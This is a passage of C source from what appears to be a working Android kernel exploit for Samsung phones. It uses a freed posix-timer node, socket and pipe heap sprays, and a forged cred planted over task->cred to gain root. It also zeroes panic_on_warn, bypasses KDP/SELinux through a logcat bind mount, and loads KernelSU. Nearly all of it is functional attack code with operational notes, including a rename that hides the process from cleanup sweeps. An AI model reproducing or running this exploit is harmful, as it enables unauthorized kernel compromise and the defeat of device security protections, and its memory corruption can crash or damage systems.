    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static void drain_spray(int fake);

static void park_forever(const char *why)
{
    logf("[!] %s -- parking without reap (zombie held)\n", why);
    fflush(stdout);
    /*
     * Stop the vm helpers before sleeping: the lockers spin mprotect loops
     * pinned to CPUs 1/3 and the killer spins tgkill on CPU 2, and a parked
     * parent never reaps them.  Left running they starve the softdog kthread
     * and the phone panics with "Software Watchdog Timer expired 100s"
     * a few minutes later.  g_stop ends the mprotect loop; exec_tid=1 makes
     * the killer's tgkill fail with ESRCH (no such tid in the target) so it
     * takes its exit path instead of spinning forever.
     */
    atomic_store(&g_exec_tid, 1);
    atomic_store(&g_stop, 1);
    /*
     * Release every spray page before sleeping.  A parked process holding
     * ~2GB of queued skb/pipe data starves kernel threads and the softdog
     * panics the phone ~100s later (verified twice in kmsg).  Freeing the
     * pages is safe here: caught payload pages are only needed until their
     * erase fires (run_plant drains those itself on every exit path), and
     * the one page that must survive -- the fake cred the root child runs
     * on -- is kept by the g_cred_live guard below.
     */
    if (!g_cred_live)
    {
        drain_spray(0);
        drain_spray(1);
    }
    /*
     * Survive the caller's teardown.  Shizuku kills the whole process
     * group when the UserService is unbound, and an interactive adb shell
     * sends SIGHUP on disconnect.  Either death reparents the held
     * zombies to init, which reaps them -- release_task() then runs
     * cleanup_timerqueue() on their stale nodes, which sit inside pages
     * the drain just freed and the allocator already handed out again.
     * That use-after-free write corrupts arbitrary live kernel data
     * (observed: system-wide app kills, damaged on-disk file metadata,
     * panic).  Detach into our own session and ignore the catchable
     * termination signals; only SIGKILL or the reboot that reverts
     * everything may end this holder.
     */
    signal(SIGTERM, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    (void)setsid();
    /* Drop the obvious exploit name so cleanup sweeps do not target us. */
    (void)prctl(PR_SET_NAME, "ksuhelperd", 0, 0, 0);
    for (;;)
        pause();
}

/*
 * Stale timer node layout inside the reclaimed order-1 page.
 *   zero: parent=0 -> rb_erase writes 0 to target.
 *   fake: parent=node -> rb_erase writes node to target (task->cred); the
 *         fake cred fields are overlaid at the same offset by run_plant.
 */
static void build_payload(unsigned char *buf, size_t off,
                          unsigned long long parent, unsigned long long target)
{
    /*
     * Single node at `off` only.  The frag page_offset is 0 (verified in
     * disasm), so the node lands exactly at V+0x78.  Do NOT tile at a 0x18
     * stride in mode 2: the extra parent/target pairs land inside the fake
     * cred (egid/fsuid +0x18, session_keyring +0x58, process_keyring +0x60,
     * request_key_auth +0x70) and the child oopses the moment it reads its
     * cred.  A memset-0 remainder is safe: rb_next() on a zeroed node
     * returns NULL, so the posix-cpu-timers exit loop still terminates.
     */
    memset(buf, 0, SOCKBUF);
    *(unsigned long long *)(buf + off + 0x00) = parent;
    *(unsigned long long *)(buf + off + 0x10) = target;
}

/* Final stage: hand the root child off to KernelSU (ksud late-load).
 * Shape copied verbatim from BuSung-dev/Root-My-Galaxy-Payloads
 * su_daemon.c:run_kernelsu_late_load -- the upstream flow verified across
 * the supported Samsung fleet (fusion-s24u inherited it from them):
 *   - ksud late-load --ephemeral --package-name me.weishu.kernelsu
 *     (no --allow-shell: su must come from the manager app only;
 *      no --kmi: ksud picks its embedded module from the running kernel)
 *   - executed through the /system/bin/logcat bind mount the C side set up
 *     in a private mount namespace (Android 16+ KDP SIGKILLs a directly
 *     exec'ed kdp-variant ksud); the namespace dies with this worker, so
 *     the bind mount never outlives the stage
 *   - NO manual SELinux re-enforce: RootMyGalaxy's exploit leaves
 *     permissive on success (root.c "selinux left" path) and never
 *     restores it from userspace.  Our earlier manual re-enforce raced
 *     ksud's own restore and killed system_server on OneUI 8 ("failed to
 *     set system property" crash loop -> UI restart -> panic).
 *   - NO daemon start, NO --version probe (a direct ksud exec gets
 *     KDP-killed and only adds "Killed" noise), NO pm/find ladder. */
static void write_ksu_script(void)
{
    static const char script[] =
        "#!/system/bin/sh\n"
        "echo \"[ksu] begin uid=$(id -u) enf=$(getenforce)\"\n"
        "echo \"[ksu] ctx=$(cat /proc/self/attr/current 2>/dev/null)\"\n"
        /* The parent only frees the spray pool (the forged cred lives in
         * one of those pages) when this marker reads "done". */
        "echo pending > /data/local/tmp/samtimer/cleanup.ok\n"
        /* Safe-mode toggle: read the app's SharedPreferences XML directly
         * (DirtyFrag pattern) instead of a relay marker the app stages --
         * one source of truth, nothing to stage or race, the state is live
         * at stage time.  The pref is absent until the user first toggles
         * the switch, so untouched installs get no side effects; value
         * true blocks (disable flag in every module dir + parked script
         * dirs), an existing-but-false pref restores.  A bad module or a
         * service.d script boot-loops the device, so this runs first, in
         * the forged root (init) context, even before the late-load -- if
         * the load fails anyway the markers still land and the next boot
         * is clean.  The kernelsu module dir itself is never disabled --
         * the chain re-establishes root every boot via late-load and does
         * not depend on the dir.  (CE prefs: readable once the user is
         * unlocked, which the 3-minute settle window makes the norm.) */
        "PF=/data/user/0/com.roottimer.app/shared_prefs/roottimer_prefs.xml\n"
        "if [ -r \"$PF\" ] && grep -q 'safe_mode' \"$PF\" 2>/dev/null; then\n"
        "  if grep -q '<boolean name=\"safe_mode\" value=\"true\"' \"$PF\"; then\n"
        "    if [ -d /data/adb/modules ]; then\n"
        "      for d in /data/adb/modules/*/; do\n"
        "        id=${d%/}; id=${id##*/}\n"
        "        [ \"$id\" = kernelsu ] && continue\n"
        "        touch \"${d}disable\"\n"
        "        echo \"[safe] module disabled: $id\"\n"
        "      done\n"
        "    fi\n"
        "    for s in post-fs-data.d service.d; do\n"
        "      [ -d \"/data/adb/$s\" ] && mv \"/data/adb/$s\" \"/data/adb/$s.disabled-by-samtimer\" && echo \"[safe] $s parked\"\n"
        "    done\n"
        "    echo '[safe] modules + script dirs blocked'\n"
        "  elif grep -q '<boolean name=\"safe_mode\"' \"$PF\"; then\n"
        "    for d in /data/adb/modules/*/; do\n"
        "      rm -f \"${d}disable\"\n"
        "    done\n"
        "    for s in post-fs-data.d service.d; do\n"
        "      [ -d \"/data/adb/$s.disabled-by-samtimer\" ] || continue\n"
        "      if [ -d \"/data/adb/$s\" ]; then\n"
        "        cp -r \"/data/adb/$s.disabled-by-samtimer/.\" \"/data/adb/$s/\"\n"
        "        rm -rf \"/data/adb/$s.disabled-by-samtimer\"\n"
        "      else\n"
        "        mv \"/data/adb/$s.disabled-by-samtimer\" \"/data/adb/$s\"\n"
        "      fi\n"
        "      echo \"[safe] $s restored\"\n"
        "    done\n"
        "    echo '[safe] modules + script dirs restored'\n"
        "  fi\n"
        "fi\n"
        "KSUD=/data/local/tmp/samtimer/ksud\n"
        "[ -x \"$KSUD\" ] || KSUD=/data/local/tmp/ksud\n"
        "if [ ! -x \"$KSUD\" ]; then echo '[ksu] ksud missing'; exit 1; fi\n"
        "echo \"[ksu] ksud=$KSUD size=$(stat -c %s \"$KSUD\" 2>/dev/null)\"\n"
        /* Version marker for the app's status card (matches "version=ksud").
         * Through the bind mount only: a direct ksud exec is KDP-killed.
         * The C side sets the mount up before this script runs. */
        "V=$(/system/bin/logcat --version 2>/dev/null | head -1)\n"
        "case \"$V\" in *ksud*|*kernelsu*) echo \"[ksu] version=$V\" ;; esac\n"
        /* late-load registers the module asynchronously; probe with a
         * settle delay like the reference does (sleep before grep). */
        "live() { sleep 1; grep -qi kernelsu /proc/modules 2>/dev/null "
        "&& echo yes || echo no; }\n"
        "LIVE=$(live)\n"
        "echo \"[ksu] live_initial=$LIVE\"\n"
        "if [ \"$LIVE\" = yes ]; then\n"
        "  echo '[ksu] already_live'\n"
        /* Nothing new was spawned with the forged cred on this path. */
        "  echo done > /data/local/tmp/samtimer/cleanup.ok\n"
        "  exit 0\n"
        "fi\n"
        /* If the C-side bind mount worked, /system/bin/logcat IS ksud
         * (KDP-safe path).  Real logcat never prints ksud/KernelSU.
         * No --ephemeral: the e1s pair's ksud does not have that option
         * (verified: late-load --help lists only magica/allow-shell/
         * post-magica/kmi/package-name); plain late-load performs the
         * full install, which is the device-tested flow for these pairs. */
        "if /system/bin/logcat --version 2>/dev/null | "
        "grep -qiE 'ksud|kernelsu'; then\n"
        "  echo '[ksu] bind mount active, exec via logcat path'\n"
        "  /system/bin/logcat late-load "
        "--package-name com.rifsxd.ksunext\n"
        "  RC=$?\n"
        "else\n"
        "  echo '[ksu] no bind mount; direct exec (KDP may kill)'\n"
        "  \"$KSUD\" late-load "
        "--package-name com.rifsxd.ksunext\n"
        "  RC=$?\n"
        "fi\n"
        "echo \"[ksu] late-load rc=$RC\"\n"
        "i=0\n"
        "while [ $i -lt 50 ]; do\n"
        "  grep -q '^kernelsu ' /proc/modules && break\n"
        "  i=$((i+1)); sleep 0.1\n"
        "done\n"
        "if grep -q '^kernelsu ' /proc/modules; then "
        "echo '[ksu] module live'; else echo '[ksu] module NOT live'; fi\n"
        /*
         * Cleanup -- the forged cred (a node in the reclaimed spray page)
         * is inherited by anything forked from this worker, including the
         * ksud daemon the late-load stages spawn.  The parent frees the
         * spray pool after this script returns, so a survivor would keep
         * a cred pointer into freed memory -- touched later it corrupts
         * arbitrary kernel memory.  Distinguish by SELinux context: a
         * forged-cred process reads "kernel" from /proc/self/attr/current,
         * while a daemon respawned by init or started by the manager
         * through the driver's root_execve carries a real kernel-issued
         * root cred and reads init/ksu.  Kill only the forged ones (safe:
         * their cred page is still alive at this point), and allow the
         * drain to proceed only when none remain.
         */
        "echo '[ksu] cleanup: forged-cred sweep'\n"
        "for p in $(pidof ksud 2>/dev/null); do\n"
        "  C=$(cat /proc/$p/attr/current 2>/dev/null)\n"
        "  echo \"[ksu] ksud pid=$p ctx=$C\"\n"
        "  case \"$C\" in kernel)\n"
        "    kill -9 $p 2>/dev/null ;;\n"
        "  esac\n"
        "done\n"
        "sleep 1\n"
        "BAD=0\n"
        "for p in $(pidof ksud 2>/dev/null); do\n"
        "  C=$(cat /proc/$p/attr/current 2>/dev/null)\n"
        "  echo \"[ksu] survivor pid=$p ctx=$C\"\n"
        "  case \"$C\" in kernel) BAD=1 ;; esac\n"
        "done\n"
        "if [ $BAD = 0 ]; then echo '[ksu] no forged-cred holders'; "
        "else echo '[ksu] WARN: forged-cred holder remains'; fi\n"
        /* panic_on_warn was zeroed through the raw-write primitive (and
         * warn_limit with it); restore it the clean way. */
        "echo 1 > /proc/sys/kernel/panic_on_warn 2>/dev/null\n"
        "echo \"[ksu] panic_on_warn=$(cat /proc/sys/kernel/panic_on_warn "
        "2>/dev/null)\"\n"
        /* Evidence that must survive a panic: the module's klog (KDP/RKP
         * detection, hook installation) is only in dmesg. */
        "dmesg | tail -n 4000 > /data/local/tmp/samtimer/dmesg_after_load.log "
        "2>&1\n"
        /* Early-warning counter: any kernel oops/WARN during the chain is
         * a reason to distrust the run and reboot before reusing it. */
        "echo \"[ksu] dmesg hazards=$(dmesg | grep -aciE "
        "'Oops|BUG:|Unable to handle')\"\n"
        "echo \"[ksu] enf=$(getenforce)\"\n"
        "if [ $BAD = 0 ]; then "
        "echo done > /data/local/tmp/samtimer/cleanup.ok; "
        "else echo refused > /data/local/tmp/samtimer/cleanup.ok; fi\n";
    int fd = open("/data/local/tmp/ksu_stage.sh",
                  O_WRONLY | O_CREAT | O_TRUNC, 0755);

    if (fd < 0)
        return;
    (void)!write(fd, script, sizeof(script) - 1);
    close(fd);
    (void)chmod("/data/local/tmp/ksu_stage.sh", 0755);
}

/*
 * Authoritative KSU check, copied from RootMyGalaxy-Payloads
 * su_daemon.c:verify_kernelsu_control: the KSU driver hands its control
 * fd out through the reboot() backdoor, then KSU_GET_INFO reports the
 * live module state (fusion-s24u verified output on this device family:
 * "KernelSU control verified version=32601 flags=0x5 uapi=2").  On a
 * stock kernel the magic reboot is just an EINVAL no-op.
 */
static int verify_ksu_control(void)
{
    struct ksu_get_info_cmd
    {
        uint32_t version;
        uint32_t flags;
        uint32_t features;
        uint32_t uapi_version;
    };
    struct ksu_get_info_cmd info;
    /* The backdoor writes the fd as a 32-bit int at the given pointer
     * (verified on-device: a 64-bit holder keeps its upper -1 bytes and
     * reads as negative).  RootMyGalaxy uses int fd as well. */
    int fd = -1;
    int ret;

    syscall(SYS_reboot, 0xDEADBEEFUL, 0xCAFEBABEUL, 0, &fd);
    if (fd < 0)
    {
        logf("[-] KSU control verify: driver fd unavailable\n");
        return 1;
    }
    memset(&info, 0, sizeof(info));
    ret = ioctl(fd, _IOR('K', 2, struct ksu_get_info_cmd), &info);
    close(fd);
    if (ret != 0 || info.version == 0 || (info.flags & 1U) == 0)
    {
        logf("[-] KSU control verify failed ret=%d errno=%d version=%u "
             "flags=0x%x uapi=%u features=0x%x\n",
             ret, errno, info.version, info.flags, info.uapi_version,
             info.features);
        return 1;
    }
    logf("[+] KSU control verified version=%u flags=0x%x uapi=%u "
         "features=0x%x\n",
         info.version, info.flags, info.uapi_version, info.features);
    return 0;
}


/*
 * UMH action script, run as "/system/bin/sh umh_action.sh" by the injected
 * work.  The usermodehelper exec must target a system-signed binary (a
 * direct exec of a /data/local/tmp binary can be killed by KDP/DEFEX
 * before its first instruction), and the script then performs the
 * /system/bin/logcat bind-mount KDP trick and hands over to the stage
 * script -- the BuSung-dev umh_action.sh pattern.
 */
static void write_umh_script(void)
{
    static const char script[] =
        "#!/system/bin/sh\n"
        "exec >/data/local/tmp/samtimer/umh-kdp.log 2>&1\n"
        "echo \"[umh] start uid=$(id -u) "
        "ctx=$(cat /proc/self/attr/current 2>/dev/null) "
        "enf=$(getenforce 2>/dev/null)\"\n"
        /* readiness marker first: the exploit parent polls for it */
        ": > /data/local/tmp/samtimer/umh-action.log\n"
        /* KSU's sepolicy only lets init reach the ksud domain */
        "echo -n u:r:init:s0 > /proc/self/attr/current 2>/dev/null\n"
        "unshare -m sh -c '\n"
        "  mount --bind /data/local/tmp/samtimer/ksud /system/bin/logcat "
        "|| { echo mount_failed; exit 11; }\n"
        "  echo \"[umh] bind mounted kdp\"\n"
        "  /system/bin/logcat --version\n"
        "  exec sh /data/local/tmp/ksu_stage.sh\n"
        "'\n"
        "echo \"[umh] outer rc=$?\"\n";
    int fd = open("/data/local/tmp/samtimer/umh_action.sh",
                  O_WRONLY | O_CREAT | O_TRUNC, 0755);

    if (fd < 0)
        return;
    (void)!write(fd, script, sizeof(script) - 1);
    close(fd);
    (void)chmod("/data/local/tmp/samtimer/umh_action.sh", 0755);
}

static int read_panic_on_warn(void)
{
    FILE *f = fopen("/proc/sys/kernel/panic_on_warn", "r");
    int value = -1;

    if (f)
    {
        if (fscanf(f, "%d", &value) != 1)
            value = -1;
        fclose(f);
    }
    logf("[ksu] panic_on_warn=%d\n", value);
    return value;
}

struct plant_res
{
    unsigned long long A;
    int ok;
    int retry;
};

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw,
                      unsigned long long static_target);

/*
 * Failed-plant zombie: the trigger's timer node is freed while still linked
 * ("stale"), so a reap would run timerqueue_del on reused memory.  Instead of
 * holding the zombie forever, make the reap safe first: posix_cpu_timers_exit
 * walks each queue via its rb_leftmost pointer and skips a queue whose
 * leftmost is NULL (verified in our vmlinux: LDR X20,[X19,#0x7A0]; CBZ).
 * Zero the three leftmost slots in the zombie's task_struct with zero plants,
 * then reap normally -- no zombie remains, so a dying holder can never hand
 * stale nodes to init's reaper.
 *
 * Three zero plants, each retried; if any cannot land the zombie is held
 * (g_held) exactly like before, so the old behaviour is the fallback.
 */
static int g_repairing;

/* loginuid read-back for the repair probe (world-readable, unlike
 * panic_on_warn which is root-only on Samsung builds). */
static long read_loginuid(pid_t p)
{
    char path[64], buf[32];
    int fd, n;

    snprintf(path, sizeof(path), "/proc/%d/loginuid", (int)p);
    fd = open(path, O_RDONLY);
    if (fd < 0)
        return -1;
    n = (int)read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0)
        return -1;
    buf[n] = 0;
    return strtol(buf, NULL, 10);
}

static void repair_zombie(pid_t z, unsigned long long ztask,
                          unsigned char *raw, int tag)
{
    static const unsigned long long slots[3] = {
        /* queue leftmosts only: the posix_cpu_timers_exit walk reads the
         * leftmost first and skips the whole queue when it is NULL, so the
         * queue roots are never dereferenced -- zeroing them would just be
         * three extra (and failure-prone) plants per zombie. */
        OFF_TQ_LEFTMOST_0, OFF_TQ_LEFTMOST_1, OFF_TQ_LEFTMOST_2
    };

    if (!ztask || (ztask & 0x3f) || g_repairing || !g_slide_set)
    {
        logf("[-] plant%d zombie %d cannot repair (task=%#llx slide=%d) "
             "-- held\n",
             tag, z, ztask, g_slide_set);
        g_held++;
        return;
    }
    g_repairing = 1;
    {
        /*
         * Round-trip probe first: the repair writes are kernel writes we
         * cannot read back directly, and a "successful" plant is only a
         * heuristic.  The zombie's loginuid (task+OFF_TASK_LOGINUID) is
         * written through the same pipeline and read back through
         * /proc/<pid>/loginuid, which is world-readable (panic_on_warn is
         * root-only on Samsung builds and cannot serve as the probe).
         * Mode 4's value is fully predictable ((V & ~0x1fff) + 0x1000),
         * so the read-back is a byte-exact check of the pipeline; mode 0
         * then proves the zero write.  Without a verified probe the
         * zombie is never reaped: a reap with stale nodes is a guaranteed
         * kernel panic.
         */
        struct plant_res r;
        int a, ok = 0;
        long got;
        unsigned int want = 0;

        for (a = 0; a < 3 && !ok; a++)
        {
            memset(&r, 0, sizeof(r));
            run_plant(ztask + OFF_TASK_LOGINUID, 88, 4, &r, raw, 0);
            if (r.ok)
                ok = 1;
            else if (!r.retry)
                break;
        }
        if (ok)
            want = (unsigned int)((((r.A - 0x78) & ~0x1fffULL) + 0x1000) &
                                  0xffffffffULL);
        got = ok ? read_loginuid(z) : -1;
        if (!ok || got != (long)want)
        {
            g_repairing = 0;
            logf("[-] plant%d zombie %d probe (nonzero) unverified "
                 "want=%#x got=%ld -- held\n", tag, z, want, got);
            g_held++;
            return;
        }
        ok = 0;
        for (a = 0; a < 3 && !ok; a++)
        {
            memset(&r, 0, sizeof(r));
            run_plant(ztask + OFF_TASK_LOGINUID, 89, 0, &r, raw, 0);
            if (r.ok)
                ok = 1;
            else if (!r.retry)
                break;
        }
        got = ok ? read_loginuid(z) : -1;
        if (!ok || got != 0)
        {
            g_repairing = 0;
            logf("[-] plant%d zombie %d probe (zero) unverified "
                 "got=%ld -- held\n", tag, z, got);
            g_held++;
            return;
        }
    }
    for (int i = 0; i < 3; i++)
    {
        struct plant_res r;
        int a, ok = 0;

        for (a = 0; a < 3; a++)
        {
            memset(&r, 0, sizeof(r));
            run_plant(ztask + slots[i], 90 + i, 0, &r, raw, 0);
            if (r.ok)
            {
                ok = 1;
                break;
            }
            if (!r.retry)
                break;
        }
        if (!ok)
        {
            g_repairing = 0;
            logf("[-] plant%d zombie %d repair[%d] failed -- held\n",
                 tag, z, i);
            g_held++;
            return;
        }
    }
    g_repairing = 0;
    kill(z, SIGKILL);
    {
        int st = 0;

        if (waitpid(z, &st, 0) == z)
            logf("[+] plant%d zombie %d repaired+reaped (st=%#x)\n",
                 tag, z, st);
        else
            logf("[!] plant%d zombie %d reap failed\n", tag, z);
    }
}

/* One-shot non-zero-pointer write to an absolute (already slid) address. */
static int run_plant_once(unsigned long long target, unsigned char *raw,
                          struct plant_res *out)
{
    for (int attempt = 1; attempt <= 5; attempt++)
    {
        memset(out, 0, sizeof(*out));
        logf("[+] stage once target=%#llx attempt=%d\n", target, attempt);
        run_plant(target, 1, 4, out, raw, 0);
        if (out->ok)
            return 0;
        if (!out->retry)
            break;
    }
    logf("[-] once write failed target=%#llx\n", target);
    return -1;
}

static int stage_write(unsigned long long target, int mode,
                       const char *what, unsigned char *raw,
                       struct plant_res *out, unsigned long long static_target){
    struct plant_res r;

    /* Retries pick a fresh victim each time (run_plant re-selects), so more
     * attempts directly raise the success rate; a success costs one plant. */
    for (int attempt = 1; attempt <= 5; attempt++)
    {
        memset(&r, 0, sizeof(r));
        logf("[+] stage %s target=%#llx mode=%s attempt=%d\n", what, target,
             mode == 2 ? "fake" : "zero", attempt);
        run_plant(target, 1, mode, &r, raw, static_target);
        if (r.ok)
        {
            if (out)
                *out = r;
            return 0;
        }
        if (!r.retry)
        {
            logf("[-] stage %s failed\n", what);
            return -1;
        }
    }
    logf("[-] stage %s exhausted retries\n", what);
    return -1;
}

#define SPRAY_THREADS 10
#define SPRAY_SOCKS 4096
#define SPRAY_PRE 4000
/* Phase 2 fires after the parent already sees the victim page free; the
 * catch happens in phase 1's continuous writes (rate, not volume).  A few
 * thousand post writes are plenty of margin -- 20000 just churned 1.6GB of
 * skbs per plant and cost seconds across the chain. */
#define SPRAY_POST 3000
#define PIPE_SPRAY_N 128
#define PIPE_PAGES_PER 4
static _Atomic int g_burst, g_burst2, g_stop_spray;
static int g_pool[SPRAY_SOCKS][2];  /* zero-mode plants; drained each time */
static int g_fpool[SPRAY_SOCKS][2]; /* mode-2 fake cred; never drained on success */
static int g_fpool_n;
static int g_pool_n;
static int g_rawfd[8] = {-1, -1, -1, -1, -1, -1, -1, -1};
static _Atomic int g_spray_tids[SPRAY_THREADS];

struct spray_arg
{
    unsigned char *payload;
    int (*pool)[2];
    int pool_n;
    int sock_first, sock_count, cpu, idx;
};

static void ensure_pool(void)
{
    int snd = 16 << 20;

    if (g_pool_n)
        return;
    for (int i = 0; i < SPRAY_SOCKS; i++)
    {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_pool[i]))
            break;
        setsockopt(g_pool[i][0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
        setsockopt(g_pool[i][1], SOL_SOCKET, SO_RCVBUF, &snd, sizeof(snd));
        g_pool_n++;
    }
    /*
     * Separate pool for the mode-2 fake-cred plant: its reclaimed page holds
     * the fake cred that task->cred points at, so it must never be drained
     * once the plant succeeds.  Every later zero-mode plant drains only
     * g_pool.
     */
    for (int i = 0; i < SPRAY_SOCKS; i++)
    {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_fpool[i]))
            break;
        setsockopt(g_fpool[i][0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
        setsockopt(g_fpool[i][1], SOL_SOCKET, SO_RCVBUF, &snd, sizeof(snd));
        g_fpool_n++;
    }
    if (!g_pool_n)
        park_forever("no spray sockets");
}

static void ensure_raw(void)
{
    for (int cpu = 0; cpu < 8; cpu++)
    {
        char path[128];

        if (g_rawfd[cpu] >= 0)
            continue;
        snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
        g_rawfd[cpu] = open(path, O_RDONLY | O_NONBLOCK);
    }
}

static long read_fd(int fd, unsigned char *buf, size_t cap)
{
    size_t tot = 0;

    if (fd < 0)
        return 0;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);

        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    return (long)tot;
}

/*
 * A page_alloc for the victim pfn is only a hit if one of our spray threads
 * performed it.  A system allocation can take the freed page first; reaping
 * that node would treat the system page contents as an rb_node and panic.
 */
static int scan_page_alloc_ours(const unsigned char *b, size_t n,
                                unsigned long long pfn)
{
    for (size_t i = 8; i + 12 <= n; i += 4)
    {
        int pid;

        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
            continue;
        if ((u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        pid = (int)u32(b, i - 4);
        for (int j = 0; j < SPRAY_THREADS; j++)
            if (pid == atomic_load(&g_spray_tids[j]))
                return 1;
    }
    return 0;
}

/*
 * Order-0 reclaim channel (GhostKey reclaim_pipe).  A pipe write of a 4KB
 * buffer allocates an order-0 pipe page holding our bytes.  V's freed
 * posix_timers_cache slab is order-1, so it splits into two order-0 pages in
 * the buddy; an order-0 pipe page then lands on the half containing the stale
 * node.  Copy a whole page with the fake node at the node's 4KB offset into
 * each pipe buffer.
 */
static int g_pspray[PIPE_SPRAY_N][2];
static int g_npspray;

/*
 * Diagnostic: dump every trace line mentioning the victim pfn so we can see
 * exactly which alloc/free touched V's page (order, pid) and whether it was
 * our spray's payload frag or something else.
 *
 * [trace] diagnostics commented out -- bring-up is done, the dump is pure
 * noise (and scans up to 200k trace lines per call).  Restore the body
 * below to re-enable.
 */
static void dump_victim_trace(unsigned long long pfn)
{
    (void)pfn;
    /*
    char line[768];
    char needle[40];
    FILE *f = fopen(TR "/trace", "r");
    int shown = 0, scanned = 0;

    if (!f)
        return;
    snprintf(needle, sizeof(needle), "pfn=%#llx", pfn);
    logf("[trace] --- events mentioning %s ---\n", needle);
    while (fgets(line, sizeof(line), f) && shown < 24 && scanned < 200000)
    {
        scanned++;
        if (strstr(line, needle))
        {
            logf("[trace] %s", line);
            shown++;
        }
    }
    fclose(f);
    logf("[trace] --- end (%d lines, scanned %d) ---\n", shown, scanned);
    */
}

static void pipe_spray(unsigned node_off, unsigned long long target)
{
    unsigned char page[4096];

    if (node_off + 24 > 4096)
        return;
    memset(page, 0, sizeof(page));
    {
        uint64_t *node = (uint64_t *)(page + node_off);

        node[0] = 0;
        node[1] = 0;
        node[2] = target;
    }
    /* Create the pipes once; later calls only append pages (a full pipe
     * just returns EAGAIN, and re-calling pipe() on the same slot would
     * leak the old fds and their kernel pages). */
    if (!g_npspray)
    {
        for (int i = 0; i < PIPE_SPRAY_N; i++)
        {
            if (pipe(g_pspray[i]))
                break;
            fcntl(g_pspray[i][1], F_SETFL, O_NONBLOCK);
            fcntl(g_pspray[i][0], F_SETFL, O_NONBLOCK);
            g_npspray++;
        }
    }
    for (int i = 0; i < g_npspray; i++)
        for (int k = 0; k < PIPE_PAGES_PER; k++)
            if (write(g_pspray[i][1], page, 4096) != 4096)
                break;
}

/*
 * Free the pages one spray left queued.  Without this each plant attempt
 * pins ~1.5-2GB of skb data; the fake-mode stage writes (times retries)
 * then exhaust memory and the kernel panics with "System is deadlocked on
 * memory".  `fake` selects which pool to drain: the fake-cred pool may only
 * be drained on FAILED attempts (a success holds the live fake cred).
 */
static void drain_spray(int fake)
{
    static unsigned char sink[65536];
    int (*pool)[2] = fake ? g_fpool : g_pool;
    int n = fake ? g_fpool_n : g_pool_n;

    for (int i = 0; i < n; i++)
    {
        ssize_t rd;

        do
            rd = recv(pool[i][1], sink, sizeof(sink), MSG_DONTWAIT);
        while (rd > 0);
    }
    if (!fake)
    {
        for (int i = 0; i < g_npspray; i++)
        {
            ssize_t rd;

            do
                rd = read(g_pspray[i][0], sink, sizeof(sink));
            while (rd > 0);
        }
    }
}

static void *spray_thread(void *x)
{
    struct spray_arg *a = x;
    int w = 0;

    atomic_store(&g_spray_tids[a->idx], (int)syscall(SYS_gettid));
    pin(a->cpu);
    while (!atomic_load(&g_burst) && !atomic_load(&g_stop_spray))
        usleep(200);
    if (atomic_load(&g_stop_spray))
        return NULL;
    /* Phase 1 runs before the target execs; it catches an early free. */
    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(a->pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    /* Phase 2 is released when the parent sees the victim page free. */
    while (!atomic_load(&g_burst2) && !atomic_load(&g_stop_spray))
        sched_yield();
    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE + SPRAY_POST)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(a->pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    return NULL;
}

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw,
                      unsigned long long static_target)
{
    unsigned long long ptrs[NTIMERS];
    unsigned long long pfn = 0, slab_pfn = 0;
    unsigned char *payload = NULL;
    pthread_t th[SPRAY_THREADS];
    struct spray_arg args[SPRAY_THREADS];
    int ready_p[2], ack_p[2], tid_p[2], timer_go[2];
    memset(res, 0, sizeof(*res));
    if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p) || pipe(timer_go))
    {
        logf("[-] plant%d pipe failed\n", tag);
        return;
    }
    /*
     * Trace from before the fork: copy_process()'s task_struct allocation is
     * what gives the failure path T's task address for the zombie repair.
     */
    trace_start();
    pid_t T = fork();
    if (T < 0)
    {
        logf("[-] plant%d fork failed\n", tag);
        trace_stop();
        return;
    }
    if (T == 0)
    {
        close(ready_p[0]);
        close(ack_p[1]);
        close(tid_p[0]);
        close(timer_go[1]);
        g_ready_w = ready_p[1];
        g_ack_r = ack_p[0];
        g_tid_w = tid_p[1];
        g_timer_go_r = timer_go[0];
        run_target();
        _exit(115);
    }
    close(ready_p[1]);
    close(ack_p[0]);
    close(tid_p[1]);
    close(timer_go[0]);
    g_timer_go_w = timer_go[1];
    char ch;
    if (read(ready_p[0], &ch, 1) != 1)
    {
        logf("[-] plant%d trigger never ready\n", tag);
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        trace_stop();
        return;
    }
    if (write(ack_p[1], "A", 1) != 1)
        logf("[-] ack failed\n");
    int etid = 0;
    if (read(tid_p[0], &etid, sizeof(etid)) != sizeof(etid))
        logf("[-] exec tid not received\n");

    /*
     * The exec thread is paused after creating its 4096 timers.  Capture V,
     * the slab pfn and the linear-map base now, before the exec/free, so the
     * spray is already running when the victim slab returns to the buddy.
     */
    long n = read_cpu(g_cpu, raw, 48u << 20);
    unsigned long long T_task = 0;

    if (n > 0)
    {
        /*
         * Only trust an unambiguous capture: the window must contain
         * exactly one task_struct alloc for our pid (T's fork).  Anything
         * else means the scan is matching something we do not understand,
         * and writing through a wrong "task" address corrupts kernel
         * memory -- so treat it as no capture and hold instead.
         */
        int tcnt = scan_task_allocs(raw, (size_t)n, (int)getpid(), &T_task,
                                    g_slide_set
                                        ? TASK_SITE_STATIC +
                                              (unsigned long long)g_slide
                                        : 0);

        if (tcnt != 1 || !T_task || (T_task & 0x3f))
        {
